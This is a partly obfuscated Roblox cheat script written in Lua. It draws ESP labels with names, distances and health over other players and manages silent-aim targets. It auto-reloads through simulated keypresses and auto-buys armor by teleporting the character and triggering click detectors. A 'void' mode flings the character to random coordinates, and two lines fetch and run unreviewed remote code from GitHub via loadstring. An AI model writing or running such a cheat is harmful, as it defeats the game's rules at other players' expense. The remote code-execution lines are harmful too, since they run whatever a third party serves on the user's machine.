
Options.BlacklistPlayers:OnChanged(function()
    _BL_RebuildCache()
    _BL_ValidateCurrentTarget()
    if Toggles.Highlight.Value and _104.active then
        _165()
    end
end)

local function _cleanupPlayerFromDropdowns(plr)
    local function removeFromSelected(toggleName, dropdownName)
        local map = Options[dropdownName] and Options[dropdownName].Value
        if type(map) == "table" then
            local formatted = string.format("%s (%s)", plr.DisplayName, plr.Name)
            if map[plr.Name] then map[plr.Name] = nil end
            if map[plr.DisplayName] then map[plr.DisplayName] = nil end
            if map[formatted] then map[formatted] = nil end
            pcall(function() Options[dropdownName]:SetValue(map) end)
        end
    end
    removeFromSelected("WhitelistEnabled", "WhitelistPlayers")
    removeFromSelected("BlacklistEnabled", "BlacklistPlayers")
end

_51.PlayerAdded:Connect(function()
    task.defer(_WL_RefreshDropdown)
    task.defer(_BL_RefreshDropdown)
    task.defer(_TP_RefreshDropdown)
end)

_51.PlayerRemoving:Connect(function(plr)
    _cleanupPlayerFromDropdowns(plr)
    task.defer(_WL_RefreshDropdown)
    task.defer(_BL_RefreshDropdown)
    task.defer(_TP_RefreshDropdown)
end)

task.defer(function()
    _WL_RefreshDropdown()
    _WL_SyncShared()
    _BL_RefreshDropdown()
end)

Options.HighlightFillColor:OnChanged(function()
    for _, _163 in pairs(_114) do
        if _163.highlight then
            _163.highlight.FillColor = Options.HighlightFillColor.Value
            _163.highlight.FillTransparency = Options.HighlightFillColor.Transparency
        end
    end
end)

Options.HighlightOutlineColor:OnChanged(function()
    for _, _163 in pairs(_114) do
        if _163.highlight then
            _163.highlight.OutlineColor = Options.HighlightOutlineColor.Value
            _163.highlight.OutlineTransparency = Options.HighlightOutlineColor.Transparency
        end
    end
end)

Options.LineColor:OnChanged(function()
    local _238 = Options.LineColor.Value
    local _239 = Options.LineColor.Transparency
    for i, _139 in ipairs(_136) do
        if _139 then
            _139.Color = _238
            _139.Transparency = _239
        end
    end
end)

game:GetService("Players").PlayerRemoving:Connect(function(_154)
    if _154 == _104.targetplayer then
        _104.targetplayer = nil
        _104.targetpart = nil
        _104.targetposition = nil
        _168(false)
        if _109 == _154 and _105 then
            _150()
        end
    end
    if _154 == _109 then
        _150()
    end
    _104.lasthealth[_154] = nil
    _104.wasknocked[_154] = nil
    if _114[_154.Name] then
        local _163 = _114[_154.Name]
        if _163.highlight then
            _163.highlight:Destroy()
        end
        if _163.connection then
            _163.connection:Disconnect()
        end
        _114[_154.Name] = nil
    end
end)

local Camera = _58
local ESPLocalPlayer = _56

local isRunning = true
local connections = {}
local spawnedTasks = {}

local names = {}
shared.FriendsCache = {}
local lastUpdateTime = 0
local UPDATE_INTERVAL = 0.033
local isRefreshingFriends = false
local lastRefreshAttempt = 0
local REFRESH_COOLDOWN = 3

local currentTargetPlayer = nil

local function updateCurrentTarget()
    if _104 and _104.targetplayer then
        currentTargetPlayer = _104.targetplayer
    elseif shared and shared.hitman and shared.hitman.silent and shared.hitman.silent.target then
        currentTargetPlayer = shared.hitman.silent.target
    else
        currentTargetPlayer = nil
    end
end

local function cleanup()
    isRunning = false
    for _, connection in pairs(connections) do
        pcall(function()
            if connection then connection:Disconnect() end
        end)
    end
    connections = {}
    for _, taskId in pairs(spawnedTasks) do
        pcall(function()
            if taskId and type(taskId) == "thread" then
                task.cancel(taskId)
            end
        end)
    end
    spawnedTasks = {}
    for player, label in pairs(names) do
        pcall(function()
            if label and label.Parent then
                label:Destroy()
            end
        end)
    end
    names = {}
    shared.FriendsCache = {}
    pcall(function()
        local coreGui = game:GetService("CoreGui")
        local screenGui = coreGui:FindFirstChild("ESPGui")
        if screenGui then
            screenGui:Destroy()
        end
    end)
end

local function fetchAllFriends()
    if not isRunning then return {} end
    local friendIds = {}
    local cursor = nil
    local hasMore = true
    local maxPages = 20
    local pageCount = 0
    while hasMore and pageCount < maxPages and isRunning do
        pageCount = pageCount + 1
        local success, result = pcall(function()
            if cursor then
                return _51:GetFriendsAsync(ESPLocalPlayer.UserId, cursor)
            else
                return _51:GetFriendsAsync(ESPLocalPlayer.UserId)
            end
        end)
        if not success or not result then
            break
        end
        local pageData = nil
        local getPageSuccess = pcall(function()
            pageData = result:GetCurrentPage()
        end)
        if not getPageSuccess or not pageData then
            break
        end
        for _, friend in ipairs(pageData) do
            if friend and friend.Id then
                friendIds[friend.Id] = {
                    UserId = friend.Id,
                    Username = friend.Username or "Unknown",
                    DisplayName = friend.DisplayName or friend.Username or "Unknown"
                }
            end
        end
        local nextCursor = nil
        local getCursorSuccess = pcall(function()
            nextCursor = result:GetNextCursor()
        end)
        if getCursorSuccess and nextCursor and nextCursor ~= "" then
            cursor = nextCursor
        else
            hasMore = false
        end
        task.wait(0.05)
    end
    return friendIds
end

local function getPlayerTeam(player)
    if not player or not player.Character then return nil end
    local character = player.Character
    local humanoid = character:FindFirstChild("Humanoid")
    if humanoid then
        local teamValue = humanoid:FindFirstChild("Team")
        if teamValue then
            return teamValue.Value
        end
    end
    local torso = character:FindFirstChild("Torso") or character:FindFirstChild("UpperTorso")
    if torso then
        local teamValue = torso:FindFirstChild("Team")
        if teamValue then
            return teamValue.Value
        end
    end
    for _, child in ipairs(character:GetChildren()) do
        if child:IsA("Accessory") then
            local handle = child:FindFirstChild("Handle")
            if handle then
                local teamValue = handle:FindFirstChild("Team")
                if teamValue then
                    return teamValue.Value
                end
            end
        end
        local teamValue = child:FindFirstChild("Team")
        if teamValue and type(teamValue.Value) == "string" then
            return teamValue.Value
        end
    end
    local characterTeam = character:GetAttribute("Team")
    if characterTeam then
        return characterTeam
    end
    return nil
end

local function isSameTeam(player)
    local localTeam = getPlayerTeam(ESPLocalPlayer)
    local playerTeam = getPlayerTeam(player)
    if not localTeam or not playerTeam then return false end
    return localTeam == playerTeam
end

local function isFriend(player)
    if not player or not player.UserId then return false end
    return shared.FriendsCache[player.UserId] ~= nil
end

local function updateAllESPLabels()
    for player, label in pairs(names) do
        if label and label.Parent and player and player.Parent then
            updateLabelStyle(label, player)
        elseif label and not label.Parent then
            names[player] = nil
        end
    end
end

local function espToggleOn(toggleName)
    return Toggles and Toggles[toggleName] and Toggles[toggleName].Value
end

local function buildESPText(player, nameText)
    local parts = {}
    if espToggleOn("ESPShowNames") then
        table.insert(parts, nameText)
    end
    local character = player.Character
    local head = character and character:FindFirstChild("Head")
    if espToggleOn("ESPShowDistance") and head then
        local dist = math.floor((Camera.CFrame.Position - head.Position).Magnitude)
        table.insert(parts, "[" .. dist .. "m]")
    end
    if espToggleOn("ESPShowHealth") and character then
        local hum = character:FindFirstChild("Humanoid")
        if hum then
            table.insert(parts, math.floor(hum.Health) .. " HP")
        end
    end
    if #parts == 0 then
        return ""
    end
    return table.concat(parts, " ")
end

local function setAllESPVisible(visible)
    for _, label in pairs(names) do
        if label and label.Parent then
            label.Visible = visible
        end
    end
end

local function updateLabelStyle(label, player)
    if not label or not player or not isRunning then return end
    if not espToggleOn("ESPEnabled") then return end
    updateCurrentTarget()
    local isPlayerFriend = isFriend(player)
    local isTeammate = isSameTeam(player)
    local isTargeted = (currentTargetPlayer == player)
    local displayName = player.DisplayName or player.Name
    if isTargeted then
        label.Text = buildESPText(player, " " .. displayName .. " ")
        label.TextColor3 = Color3.fromRGB(102, 0, 0)
        label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
        label.TextStrokeTransparency = 0
        label.TextSize = 14
        label.Font = Enum.Font.GothamBold
    elseif isTeammate then
        label.Text = buildESPText(player, "◉ " .. displayName .. " ◉")
        label.TextColor3 = Color3.fromRGB(0, 255, 0)
        label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
        label.TextStrokeTransparency = 0
        label.TextSize = 13
        label.Font = Enum.Font.GothamBold
    elseif isPlayerFriend then
        label.Text = buildESPText(player, "★ " .. displayName .. " ★")
        label.TextColor3 = Color3.fromRGB(0, 200, 255)
        label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
        label.TextStrokeTransparency = 0
        label.TextSize = 13
        label.Font = Enum.Font.GothamBold
    else
        label.Text = buildESPText(player, displayName)
        label.TextColor3 = Color3.fromRGB(255, 50, 50)
        label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
        label.TextStrokeTransparency = 0
        label.TextSize = 13
        label.Font = Enum.Font.GothamBold
    end
end

local function refreshFriendsList()
    if not isRunning then return end
    local currentTime = tick()
    if isRefreshingFriends or (currentTime - lastRefreshAttempt < REFRESH_COOLDOWN) then
        return
    end
    isRefreshingFriends = true
    lastRefreshAttempt = currentTime
    local success, result = pcall(fetchAllFriends)
    if success and result then
        shared.FriendsCache = result
        updateAllESPLabels()
        pcall(_BL_ValidateCurrentTarget)
        pcall(_WL_ValidateCurrentTarget)
    end
    isRefreshingFriends = false
end

local function createName(player)
    if not isRunning then return nil end
    local label = Instance.new("TextLabel")
    label.BackgroundTransparency = 1
    label.TextStrokeTransparency = 0
    label.TextSize = 13
    label.Font = Enum.Font.GothamBold
    label.AnchorPoint = Vector2.new(0.5, 0.5)
    label.BorderSizePixel = 0
    label.TextXAlignment = Enum.TextXAlignment.Center
    label.TextYAlignment = Enum.TextYAlignment.Center
    label.Visible = false
    label.TextColor3 = Color3.fromRGB(255, 255, 255)
    label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    label.ZIndex = 10
    local coreGui = game:GetService("CoreGui")
    local screenGui = coreGui:FindFirstChild("ESPGui")
    if not screenGui then
        screenGui = Instance.new("ScreenGui")
        screenGui.Name = "ESPGui"
        screenGui.ResetOnSpawn = false
        screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
        screenGui.Parent = coreGui
    end
    label.Parent = screenGui
    return label
end

local function addPlayerESP(player)
    if not isRunning then return end
    if player == ESPLocalPlayer then return end
    if names[player] then return end
    if not player or not player.Parent then return end
    local label = createName(player)
    if label then
        names[player] = label
        updateLabelStyle(label, player)
    end
end

local function removePlayerESP(player)
    if names[player] then
        local label = names[player]
        names[player] = nil
        pcall(function()
            if label and label.Parent then
                label:Destroy()
            end
        end)
    end
end

local function getDynamicHeadPosition(head)
    if not head or not head.Parent then return nil, false end
    local headCFrame = head.CFrame
    local headSize = head.Size
    local topCenter = headCFrame.Position + Vector3.new(0, headSize.Y / 2, 0)
    local screenPos, isOnScreen = Camera:WorldToScreenPoint(topCenter)
    if not isOnScreen or screenPos.Z <= 0 then
        return nil, false
    end
    local distance = (Camera.CFrame.Position - head.Position).Magnitude
    local yOffset
    if distance < 50 then
        yOffset = 22
    elseif distance < 150 then
        local t = (distance - 50) / 100
        yOffset = 22 - (t * 7)
    else
        yOffset = 12
    end
    return Vector2.new(screenPos.X, screenPos.Y - yOffset), true
end

local function setupFriendStatusMonitoring()
    local function onPlayerAdded(player)
        task.wait(0.3)
        if isRunning and shared.FriendsCache[player.UserId] then
            if names[player] then
                updateLabelStyle(names[player], player)
            end
        end
    end
    connections.FriendStatusMonitor = _51.PlayerAdded:Connect(onPlayerAdded)
end

local function setupESP()
    if not isRunning then return end
    task.spawn(function()
        refreshFriendsList()
    end)
    for _, player in ipairs(_51:GetPlayers()) do
        if player ~= ESPLocalPlayer then
            addPlayerESP(player)
        end
    end
    connections.PlayerAdded = _51.PlayerAdded:Connect(function(player)
        if player ~= ESPLocalPlayer then
            addPlayerESP(player)
            task.wait(0.1)
            if isRunning and shared.FriendsCache[player.UserId] then
                if names[player] then
                    updateLabelStyle(names[player], player)
                end
            end
            pcall(_BL_ValidateCurrentTarget)
            pcall(_WL_ValidateCurrentTarget)
            task.defer(_WL_RefreshDropdown)
            task.defer(_BL_RefreshDropdown)
        end
    end)
    connections.PlayerRemoving = _51.PlayerRemoving:Connect(function(player)
        removePlayerESP(player)
    end)
    local function onCharacterAdded(player)
        if names[player] and isRunning then
            updateLabelStyle(names[player], player)
        end
    end
    for _, player in ipairs(_51:GetPlayers()) do
        if player ~= ESPLocalPlayer then
            local connection = player.CharacterAdded:Connect(function()
                onCharacterAdded(player)
            end)
            connections[player] = connection
        end
    end
    connections.CharacterAddedGlobal = _51.PlayerAdded:Connect(function(player)
        if player ~= ESPLocalPlayer then
            local connection = player.CharacterAdded:Connect(function()
                onCharacterAdded(player)
            end)
            connections[player .. "_char"] = connection
        end
    end)
    connections.RenderStepped = _52.RenderStepped:Connect(function()
        if not isRunning then return end
        if not espToggleOn("ESPEnabled") then
            setAllESPVisible(false)
            return
        end
        updateCurrentTarget()
        local currentTime = tick()
        if currentTime - lastUpdateTime < UPDATE_INTERVAL then
            return
        end
        lastUpdateTime = currentTime
        for player, label in pairs(names) do
            if not label or not label.Parent then
                removePlayerESP(player)
                continue
            end
            if not player or not player.Parent then
                removePlayerESP(player)
                continue
            end
            local character = player.Character
            if not character or not character.Parent then
                if label.Visible then label.Visible = false end
                continue
            end
            local humanoid = character:FindFirstChild("Humanoid")
            if not humanoid or humanoid.Health <= 0 then
                if label.Visible then label.Visible = false end
                continue
            end
            local head = character:FindFirstChild("Head")
            if not head then
                if label.Visible then label.Visible = false end
                continue
            end
            updateLabelStyle(label, player)
            if label.Text == "" then
                if label.Visible then label.Visible = false end
                continue
            end
            local screenPos, isOnScreen = getDynamicHeadPosition(head)
            if isOnScreen and screenPos then
                label.Position = UDim2.new(0, screenPos.X, 0, screenPos.Y)
                if not label.Visible then label.Visible = true end
                local distance = (Camera.CFrame.Position - head.Position).Magnitude
                local textSize = 13
                if distance > 150 then
                    textSize = math.clamp(13 - ((distance - 150) / 200), 10, 13)
                end
                label.TextSize = textSize
                label.TextTransparency = 0
                label.TextStrokeTransparency = 0
            else
                if label.Visible then label.Visible = false end
            end
        end
    end)
    spawnedTasks[1] = task.spawn(function()
        if not isRunning then return end
        task.wait(0.5)
        if isRunning then
            refreshFriendsList()
        end
    end)
    spawnedTasks[2] = task.spawn(function()
        while isRunning do
            task.wait(2)
            if isRunning then
                refreshFriendsList()
            end
        end
    end)
    connections.AncestryChanged = ESPLocalPlayer.AncestryChanged:Connect(function()
        if not ESPLocalPlayer.Parent then
            cleanup()
        end
    end)
    connections.CameraChanged = _53:GetPropertyChangedSignal("CurrentCamera"):Connect(function()
        Camera = _53.CurrentCamera
    end)
    setupFriendStatusMonitoring()
end

Toggles.ESPEnabled:OnChanged(function(value)
    if not value then
        setAllESPVisible(false)
    else
        updateAllESPLabels()
    end
end)

Toggles.ESPShowNames:OnChanged(function()
    if espToggleOn("ESPEnabled") then
        updateAllESPLabels()
    end
end)

Toggles.ESPShowDistance:OnChanged(function()
    if espToggleOn("ESPEnabled") then
        updateAllESPLabels()
    end
end)

Toggles.ESPShowHealth:OnChanged(function()
    if espToggleOn("ESPEnabled") then
        updateAllESPLabels()
    end
end)

setupESP()

if not espToggleOn("ESPEnabled") then
    setAllESPVisible(false)
end

_48:OnUnload(function()
    _AR_Running = false
    isRunning = false
    cleanup()
    _150()
    _161()
    _193()
    _243.enabled = false
    _245()
    if _254 then _254:Disconnect() end
    if _255 then _255:Disconnect() end
    if _237 then _237:Disconnect() end
    if _121 then
        _121:Disconnect()
        _121 = nil
    end
    if _133 then _133:Destroy() end
    _138()
end)

local _AR_Running = true

task.spawn(function()
    while _AR_Running do
        if not Toggles.AutoReload.Value then
            task.wait(0.5)
            continue
        end
        local char = _56.Character
        local tool = char and char:FindFirstChildWhichIsA("Tool")
        if tool then
            for _, v in pairs(tool:GetDescendants()) do
                if (v:IsA("IntValue") or v:IsA("NumberValue")) and v.Value <= 0 then
                    keypress(0x52)
                    task.wait(0.05)
                    keyrelease(0x52)
                    break
                end
            end
        end
        task.wait(0.1)
    end
end)

task.spawn(function()
    while true do
        if Toggles.AutoEquipDB and Toggles.AutoEquipDB.Value then
            local char = _56.Character
            local bp = _56.Backpack
            local holding = char and char:FindFirstChildWhichIsA("Tool")
            if not (holding and holding.Name:lower():find("double")) then
                local db = nil
                for _, t in ipairs(bp:GetChildren()) do
                    if t:IsA("Tool") and t.Name:lower():find("double") then
                        db = t
                        break
                    end
                end
                if not db and char then
                    for _, t in ipairs(char:GetChildren()) do
                        if t:IsA("Tool") and t.Name:lower():find("double") then
                            db = t
                            break
                        end
                    end
                end
                if db and char then
                    db.Parent = char
                end
            end
        end
        task.wait(0.01)
    end
end)
loadstring(game:HttpGet('https://raw.githubusercontent.com/imcomingforyou6959-gif/UR4/refs/heads/main/Supporting/Commands.lua'))()

local _AA_cache = nil
local _AA_busy = false
local _AA_connections = {}

local function _AA_getArmor()
    if _AA_cache and _AA_cache.Parent then return _AA_cache end
    for _, v in ipairs(workspace:GetDescendants()) do
        if v.Name == "Armor" and v:IsA("ValueBase") then
            local p = v.Parent
            if p and p.Name == "BodyEffects" then
                local pp = p.Parent
                if pp and pp.Name == _56.Name then
                    _AA_cache = v
                    return v
                end
            end
        end
    end
end

local function _AA_getArmorValue()
    local a = _AA_getArmor()
    return a and a.Value or 0
end

local function _AA_validArmorName(n)
    n = string.lower(n):gsub("%s+", ""):gsub("%-", "")
    if not string.find(n, "armor") or string.find(n, "fire") or string.find(n, "medium") or string.find(n, "mdedium") then
        return false
    end
    return true
end

local function _AA_findBest()
    local ba, bs = nil, -math.huge
    for _, v in ipairs(workspace:GetDescendants()) do
        if _AA_validArmorName(v.Name) then
            local pr = v:FindFirstChild("Price")
            if pr and pr:IsA("ValueBase") then
                local sc = pr.Value
                if string.find(string.lower(v.Name), "full") then
                    sc = sc + 100000
                end
                if sc > bs then
                    bs = sc
                    ba = v
                end
            end
        end
    end
    return ba
end

local function _AA_buy()
    if _AA_busy then return end
    _AA_busy = true
    local wasVoidActive = _118
    if wasVoidActive then
        _118 = false
        if _121 then
            _121:Disconnect()
            _121 = nil
        end
        if _120 and _119 then
            local _148 = _56.Character and _56.Character:FindFirstChildOfClass("Humanoid")
            if _148 then
                _148.PlatformStand = true
            end
            _120.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
            _120.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
            _120.CFrame = _119
            task.wait(0.5)
            if _148 then
                _148.PlatformStand = false
            end
        end
        _119 = nil
        task.wait(0.3)
    end
    local ch = _56.Character or _56.CharacterAdded:Wait()
    local rt = ch:WaitForChild("HumanoidRootPart")
    local t0 = tick()
    local threshold = Options.AutoArmorThreshold and Options.AutoArmorThreshold.Value or 200
    while _AA_getArmorValue() < threshold and tick() - t0 < 8 do
        local sv = _AA_getArmorValue()
        local it = _AA_findBest()
        if not it then break end
        local pt = it.PrimaryPart or it:FindFirstChildWhichIsA("BasePart")
        local cd = it:FindFirstChild("ClickDetector")
        if not pt or not cd then break end
        local oc = rt.CFrame
        rt.CFrame = pt.CFrame * CFrame.new(0, -3, 0)
        for i = 1, 5 do
            fireclickdetector(cd)
            task.wait(0.05)
        end
        local okk = false
        local w0 = tick()
        repeat
            if _AA_getArmorValue() > sv then okk = true break end
            task.wait(0.1)
        until tick() - w0 > 1
        rt.CFrame = oc
        task.wait(okk and 0.2 or 0.5)
    end
    _AA_busy = false
    if wasVoidActive then
        if _120 then
            _119 = _120.CFrame
        end
        _118 = true
        _143()
        _146()
        if _121 then
            _121:Disconnect()
        end
        _121 = _52.Heartbeat:Connect(function()
            if _118 and _120 then
                local _t = tick()
                _120.CFrame = CFrame.new(
                    math.floor((_t * 4423) % 999999991) * math.sign(math.sin(_t * 7919)),
                    math.floor((_t * 6287) % 999999973) * math.sign(math.cos(_t * 6421)),
                    math.floor((_t * 3499) % 999999937) * math.sign(math.sin(_t * 8737))
                ) * CFrame.Angles(
                    (_t * 17) % (math.pi * 2),
                    (_t * 31) % (math.pi * 2),
                    (_t * 53) % (math.pi * 2)
                )
            end
        end)
    end
end

_AA_connections.charAdded = _56.CharacterAdded:Connect(function()
    _AA_cache = nil
    task.wait(1)
    if Toggles.AutoArmor.Value then
        if Toggles.AutoArmorVoidIgnore.Value or not _118 then
            _AA_buy()
        end
    end
end)

task.spawn(function()
    while task.wait(0.2) do
        if not Toggles.AutoArmor.Value then continue end
        if not Toggles.AutoArmorVoidIgnore.Value and _118 then continue end
        local v = _AA_getArmorValue()
        local threshold = Options.AutoArmorThreshold and Options.AutoArmorThreshold.Value or 200
        if v < threshold then
            task.spawn(_AA_buy)
        end
    end
end)

if _56.Character then
    task.wait(1)
    if Toggles.AutoArmor.Value then
        if Toggles.AutoArmorVoidIgnore.Value or not _118 then
            _AA_buy()
        end
    end
end
loadstring(game:HttpGet('https://raw.githubusercontent.com/imcomingforyou6959-gif/UR4/refs/heads/main/Supporting/Jumpc.lua'))()
return {
    targetaim = _104,
    togglevoid = _147,
    setmode = function(_241)
        local modeMap = { sticky = 'Sticky', ['auto select'] = 'Auto Select', ['target all'] = 'Target All', multi = 'Multi' }
        if modeMap[_241] then
            _104.mode = _241
            _104.currentmode = _241
            shared.hitman.silent.mode = _241
            Options.Mode:SetValue(modeMap[_241])
        end
    end,
    desktop = _130,
    console = _129,
    specting = _149,
    nonspect = _150,
    updhigh = _165,
    removeskidlights = _161
}
